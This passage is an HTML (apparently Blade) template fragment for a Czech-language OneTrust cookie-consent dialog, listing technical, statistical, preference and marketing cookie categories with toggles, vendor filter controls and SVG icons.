                <button id="accept-recommended-btn-handler" style="display: inline-block;" tabindex="0">Povolit vše
                </button>
                <section class="ot-sdk-row ot-cat-grp">
                    <h3 id="ot-category-title">Jednotlivé souhlasy i s detaily</h3>
                    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0001">
                        <button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0001"
                                aria-labelledby="ot-header-id-C0001"></button>
                        <!-- Accordion header -->
                        <div class="ot-acc-hdr ot-always-active-group">
                            <h4 class="ot-cat-header" id="ot-header-id-C0001">Technické – aby naše stránky mohly
                                fungovat</h4>
                            <div class="ot-arw-cntr">
                                <svg class="ot-arw" aria-hidden="true" focusable="false" data-prefix="fas"
                                     data-icon="caret-right" role="img" xmlns="http://www.w3.org/2000/svg"
                                     viewBox="0 0 192 512">
                                    <path fill="currentColor"
                                          d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z"></path>
                                </svg>
                            </div>
                            <div class="ot-always-active">Vždy aktivní</div>
                        </div>
                        <!-- accordion detail -->
                        <div class="ot-acc-grpcntr ot-acc-txt">
                            <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">Tyto cookies jsou nezbytné
                                kvůli správnému fungování, bezpečnosti, řádnému zobrazování na počítači nebo na mobilu,
                                fungujícímu vyplňování i odesílání formulářů a podobně.. Technické cookies není možné
                                vypnout, bez nich by naše stránky nefungovaly správně.</p>
                        </div>
                    </div>
                    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0002">
                        <button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0002"
                                aria-labelledby="ot-header-id-C0002"></button>
                        <!-- Accordion header -->
                        <div class="ot-acc-hdr">
                            <h4 class="ot-cat-header" id="ot-header-id-C0002">Statistické – abychom věděli, co
                                zlepšit</h4>
                            <div class="ot-arw-cntr">
                                <svg class="ot-arw" aria-hidden="true" focusable="false" data-prefix="fas"
                                     data-icon="caret-right" role="img" xmlns="http://www.w3.org/2000/svg"
                                     viewBox="0 0 192 512">
                                    <path fill="currentColor"
                                          d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z"></path>
                                </svg>
                            </div>
                            <div class="ot-tgl">
                                <input type="checkbox" name="ot-group-id-C0002" id="ot-group-id-C0002"
                                       aria-checked="true"
                                       role="switch" class="category-switch-handler" data-optanongroupid="C0002"
                                       checked=""
                                       aria-labelledby="ot-header-id-C0002" tabindex="0">
                                <label class="ot-switch" for="ot-group-id-C0002"><span class="ot-switch-nob"></span>
                                    <span
                                            class="ot-label-txt">Statistické – abychom věděli, co zlepšit</span></label>
                            </div>
                        </div>
                        <!-- accordion detail -->
                        <div class="ot-acc-grpcntr ot-acc-txt">
                            <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">Čím víc lidí má statistické
                                cookies zapnuté, tím lépe můžeme naše stránky vyladit. Třeba tak, že hojně navštěvované
                                části stránek přesuneme hned na hlavní stránku a ušetříme tak hledání ostatním
                                návštěvníkům.
                                Díky nim jsme schopni zjistit odkud k nám lidé přicházejí, na co klikají, jak dlouho u
                                nás
                                zůstávají apod. Zpracování statistických cookies je našim oprávněným zájmem. Proti
                                tomuto
                                zpracování zde můžete uplatnit námitku a zastavit jejich zpracování.</p>
                        </div>
                    </div>
                    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0003">
                        <button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0003"
                                aria-labelledby="ot-header-id-C0003"></button>
                        <!-- Accordion header -->
                        <div class="ot-acc-hdr">
                            <h4 class="ot-cat-header" id="ot-header-id-C0003">Preferenční – abyste rychleji našli, co
                                hledáte</h4>
                            <div class="ot-arw-cntr">
                                <svg class="ot-arw" aria-hidden="true" focusable="false" data-prefix="fas"
                                     data-icon="caret-right" role="img" xmlns="http://www.w3.org/2000/svg"
                                     viewBox="0 0 192 512">
                                    <path fill="currentColor"
                                          d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z"></path>
                                </svg>
                            </div>
                            <div class="ot-tgl">
                                <input type="checkbox" name="ot-group-id-C0003" id="ot-group-id-C0003"
                                       aria-checked="false"
                                       role="switch" class="category-switch-handler" data-optanongroupid="C0003"
                                       aria-labelledby="ot-header-id-C0003" tabindex="0">
                                <label class="ot-switch" for="ot-group-id-C0003"><span class="ot-switch-nob"></span>
                                    <span
                                            class="ot-label-txt">Preferenční – abyste rychleji našli, co hledáte</span></label>
                            </div>
                        </div>
                        <!-- accordion detail -->
                        <div class="ot-acc-grpcntr ot-acc-txt">
                            <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0003">Díky těmto cookies vám na
                                našich stránkách nabídneme především takové služby, které pro vás budou zajímavé, a
                                naopak
                                vás nebudeme obtěžovat s něčím, co už máte nebo to nepotřebujete. Na základě informací,
                                které o vás pomocí těchto cookie získáme, přizpůsobíme obsah našich stránek. Pro
                                dosažení
                                tohoto účelu může docházet k profilováni. Tyto cookies zpracováváme na základě vašeho
                                souhlasu. Souhlas zde můžete kdykoliv udělit, či odvolat.</p>
                        </div>
                    </div>
                    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0004">
                        <button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0004"
                                aria-labelledby="ot-header-id-C0004"></button>
                        <!-- Accordion header -->
                        <div class="ot-acc-hdr">
                            <h4 class="ot-cat-header" id="ot-header-id-C0004">Marketingové – aby se vám nezobrazovaly
                                nezajímavé reklamy</h4>
                            <div class="ot-arw-cntr">
                                <svg class="ot-arw" aria-hidden="true" focusable="false" data-prefix="fas"
                                     data-icon="caret-right" role="img" xmlns="http://www.w3.org/2000/svg"
                                     viewBox="0 0 192 512">
                                    <path fill="currentColor"
                                          d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z"></path>
                                </svg>
                            </div>
                            <div class="ot-tgl">
                                <input type="checkbox" name="ot-group-id-C0004" id="ot-group-id-C0004"
                                       aria-checked="false"
                                       role="switch" class="category-switch-handler" data-optanongroupid="C0004"
                                       aria-labelledby="ot-header-id-C0004" tabindex="0">
                                <label class="ot-switch" for="ot-group-id-C0004"><span class="ot-switch-nob"></span>
                                    <span
                                            class="ot-label-txt">Marketingové  – aby se vám nezobrazovaly nezajímavé reklamy</span></label>
                            </div>
                        </div>
                        <!-- accordion detail -->
                        <div class="ot-acc-grpcntr ot-acc-txt">
                            <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0004">Díky marketingovým cookies
                                třetích stran vám můžeme připomenout nabídky, které jste si prohlíželi na našich
                                stránkách,
                                i jinde na internetu: na Facebooku, na Googlu nebo třeba na Seznamu. Když tyto cookies
                                zakážete, reklam bude pořád stejně. Ovšem na věci, které vás nezajímají. Pro dosažení
                                tohoto
                                účelu může docházet k profilováni. Tyto cookies zpracováváme na základě vašeho souhlasu.
                                Souhlas zde můžete kdykoliv udělit, či odvolat.</p>
                        </div>
                    </div>
                    <!-- Groups sections starts -->
                    <!-- Group section ends -->
                    <!-- Accordion Group section starts -->
                    <!-- Accordion Group section ends -->
                </section>
            </div>
            <section id="ot-pc-lst" class="ot-hide ot-hosts-ui ot-pc-scrollbar ot-enbl-chr">
                <div id="ot-pc-hdr">
                    <h3 id="ot-lst-title">
                        <button class="ot-link-btn back-btn-handler" aria-label="Back" tabindex="0">
                            <svg id="ot-back-arw" xmlns="http://www.w3.org/2000/svg"
                                 xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                                 viewBox="0 0 444.531 444.531"
                                 xml:space="preserve"><title>Back Button</title>
                                <g>
                                    <path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                    l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                    c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                    s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                    L213.13,222.409z"></path>
                                </g></svg>
                        </button>
                        <span>Performance Cookies</span></h3>
                    <div class="ot-lst-subhdr">
                        <div class="ot-search-cntr">
                            <p role="status" class="ot-scrn-rdr"></p>
                            <label for="vendor-search-handler" class="ot-scrn-rdr">Vendor Search</label>
                            <input id="vendor-search-handler" type="text" placeholder="Search..."
                                   name="vendor-search-handler" tabindex="0">
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
                                 y="0px" viewBox="0 -30 110 110">
                                <title>Search Icon</title>
                                <path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
            s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
            c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
            s-17-7.626-17-17S14.61,6,23.984,6z"></path>
                            </svg>
                        </div>
                        <div class="ot-fltr-cntr">
                            <button id="filter-btn-handler" aria-label="Filter" aria-haspopup="true">
                                <svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"
                                     xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                                     viewBox="0 0 402.577 402.577" xml:space="preserve">
									<title>Filter Icon</title>
                                    <g>
                                        <path fill="#fff" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
      c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
      c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
      C402.765,25.895,404.093,19.231,400.858,11.427z"></path>
                                    </g>
								</svg>
                            </button>
                        </div>
                        <div id="ot-anchor"></div>
                        <section id="ot-fltr-modal">
                            <div id="ot-fltr-cnt">
                                <button id="clear-filters-handler">Clear</button>
                                <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
                                    <div class="ot-fltr-opts">
                                        <div class="ot-fltr-opt">
                                            <div class="ot-chkbox">
                                                <input id="chkbox-id" type="checkbox" aria-checked="false"
                                                       class="category-filter-handler" tabindex="0">
                                                <label for="chkbox-id"><span
                                                            class="ot-label-txt">checkbox label</span></label> <span
                                                        class="ot-label-status">label</span></div>
                                        </div>
                                    </div>
                                    <div class="ot-fltr-btns">
                                        <button id="filter-apply-handler">Apply</button>
                                        <button id="filter-cancel-handler">Cancel</button>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </div>
                </div>
                <section id="ot-lst-cnt" class="ot-host-cnt ot-pc-scrollbar">
                    <div id="ot-sel-blk">
                        <div class="ot-sel-all">
                            <div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span
                                        class="ot-li-hdr">Leg.Interest</span>
                            </div>
                            <div class="ot-sel-all-chkbox">
                                <div class="ot-chkbox" id="ot-selall-hostcntr">
                                    <input id="select-all-hosts-groups-handler" type="checkbox" aria-checked="false"
                                           tabindex="0">
                                    <label for="select-all-hosts-groups-handler"><span
                                                class="ot-label-txt">checkbox label</span></label> <span
                                            class="ot-label-status">label</span></div>
                                <div class="ot-chkbox" id="ot-selall-vencntr">
                                    <input id="select-all-vendor-groups-handler" type="checkbox" aria-checked="false"
                                           tabindex="0">
                                    <label for="select-all-vendor-groups-handler"><span
                                                class="ot-label-txt">checkbox label</span></label> <span
                                            class="ot-label-status">label</span></div>
                                <div class="ot-chkbox" id="ot-selall-licntr">
                                    <input id="select-all-vendor-leg-handler" type="checkbox" aria-checked="false"
                                           tabindex="0">
                                    <label for="select-all-vendor-leg-handler"><span
                                                class="ot-label-txt">checkbox label</span></label> <span
                                            class="ot-label-status">label</span></div>
                            </div>
                        </div>
                    </div>
                    <div class="ot-sdk-row">
                        <div class="ot-sdk-column"></div>
                    </div>
                </section>
            </section>
            <div class="ot-pc-footer">
                <div class="ot-btn-container">
                    <button class="save-preference-btn-handler onetrust-close-btn-handler" tabindex="0">Potvrdit vybrané
                    </button>
                </div>
                <!-- Footer logo -->
                <div class="ot-pc-footer-logo">
                    <a href="https://www.onetrust.com/products/cookie-consent/" target="_blank"
                       rel="noopener noreferrer"
                       style="background-image: url('https://statistics.csob.cz/consent/601d51af-6197-4fef-8c9d-161452538d80/2560ef85-51ea-4806-876e-8e93f1dcdc77/logos/static/poweredBy_ot_logo.svg');"
                       aria-label="Powered by OneTrust Otevírá se na nové záložce." tabindex="0"></a>
                </div>
            </div>
            <!-- Cookie subgroup container -->
            <!-- Vendor list link -->
            <!-- Cookie lost link -->
            <!-- Toggle HTML element -->
            <!-- Checkbox HTML -->
            <!-- plus minus-->
            <!-- Arrow SVG element -->
            <!-- Accordion basic element --><span class="ot-scrn-rdr" aria-atomic="true" aria-live="polite">Vaše soukromí [`dialog closed`]</span>
        </div>
        <div id="ot-sdk-btn-floating" title="Nastavení preferencí cookies" class="ot-floating-button">
            <div class="ot-floating-button__front">
                <button type="button" class="ot-floating-button__open" aria-label="" aria-hidden="true">
                    <svg role="presentation" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <path class="ot-floating-button__svg-fill"
                              d="M14.588 0l.445.328c1.807 1.303 3.961 2.533 6.461 3.688 2.015.93 4.576 1.746 7.682 2.446 0 14.178-4.73 24.133-14.19 29.864l-.398.236C4.863 30.87 0 20.837 0 6.462c3.107-.7 5.668-1.516 7.682-2.446 2.709-1.251 5.01-2.59 6.906-4.016zm5.87 13.88a.75.75 0 00-.974.159l-5.475 6.625-3.005-2.997-.077-.067a.75.75 0 00-.983 1.13l4.172 4.16 6.525-7.895.06-.083a.75.75 0 00-.16-.973z"
                              fill="#FFF" fill-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="ot-floating-button__back">
                <button type="button" class="ot-floating-button__close" aria-label="Zavřít předvolby"
                        aria-hidden="false">
                    <!--?xml version="1.0" encoding="UTF-8"?-->
                    <svg role="presentation" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg"
                         aria-hidden="true">
                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                            <g id="Banner_02" class="ot-floating-button__svg-fill"
                               transform="translate(-318.000000, -725.000000)" fill="#ffffff" fill-rule="nonzero">
                                <g id="Group-2" transform="translate(305.000000, 712.000000)">
                                    <g id="icon/16px/white/close">
                                        <polygon id="Line"
                                                 points="13.3333333 14.9176256 35.0823744 36.6666667 36.6666667 35.0823744 14.9176256 13.3333333"></polygon>
                                        <polygon id="Line"
                                                 transform="translate(25.000000, 25.000000) scale(-1, 1) translate(-25.000000, -25.000000) "
                                                 points="13.3333333 14.9176256 35.0823744 36.6666667 36.6666667 35.0823744 14.9176256 13.3333333"></polygon>
                                    </g>
                                </g>
                            </g>
                        </g>
                    </svg>
                </button>
            </div>
        </div>
    </div>


    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
@endsection
@push('js')
@endpush